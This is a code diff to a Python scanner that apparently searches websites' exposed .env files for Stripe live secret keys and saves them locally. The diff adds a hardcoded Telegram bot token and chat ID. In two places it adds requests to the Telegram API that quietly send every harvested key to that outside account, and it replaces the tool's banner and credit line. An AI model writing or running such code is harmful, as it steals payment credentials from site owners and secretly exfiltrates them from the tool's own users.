@@ -11,6 +11,11 @@ from os import path
 from concurrent.futures import ThreadPoolExecutor
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
+
+Bot_TOKEN = "6499451854:AAG9WRVTVM2ILmjnoLWLN1OQYGbEY4dxskQ"
+USER_ID = "1312277549"
+
 class xcol:
     LGREEN = '\033[38;2;129;199;116m'
     LRED = '\033[38;2;239;83;80m'
@@ -40,6 +45,8 @@ class ENV :
                   if "sk_live" in x:
                      file_object = open('SK_LIVE.TXT', 'a')
                      file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
+                     tokyo_sender = (re.sub(".*sk_live","sk_live",x)+'\n')
+                     hit_sender = requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
                      file_object.close()
             else :
                rr = 'RE'
@@ -66,6 +73,8 @@ class ENV :
                      if "sk_live" in x:
                         file_object = open('SK_LIVE.TXT', 'a')
                         file_object.write(re.sub(".*sk_live","sk_live",x)+'\n')
+                        tokyo_sender = (re.sub(".*sk_live","sk_live",x)+'\n')
+                        hit_sender = requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={tokyo_sender}&parse_mode=HTML")
                         file_object.close()
                else:
                   rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
@@ -77,14 +86,14 @@ class ENV :
 if __name__ == '__main__':
    os.system('clear')
    print(""" \033[38;2;158;158;158m
-
-    ░███ █░░█    ███ █░░░█ █░░░█  
-   █░░░ █░█░    █░░ ██░░█ █░░░█  
-   ░██░ ██░░    ███ █░█░█ ░█░█░  
-   ░░░█ █░█░    █░░ █░░██ ░███░  
-   ███░ █░░█    ███ █░░░█ ░░█░░  
+███████╗██╗  ██╗    ███████╗███╗   ██╗██╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
+██╔════╝██║ ██╔╝    ██╔════╝████╗  ██║██║   ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
+███████╗█████╔╝     █████╗  ██╔██╗ ██║██║   ██║    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+╚════██║██╔═██╗     ██╔══╝  ██║╚██╗██║╚██╗ ██╔╝    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+███████║██║  ██╗    ███████╗██║ ╚████║ ╚████╔╝     ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
+╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝  ╚═══╝      ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+                                                                                                               
  
-: PRVT8 TOOL BY RESS : PAID ONLY
   \u001B[0m""")
 
    if not os.path.isdir("ENVS"):
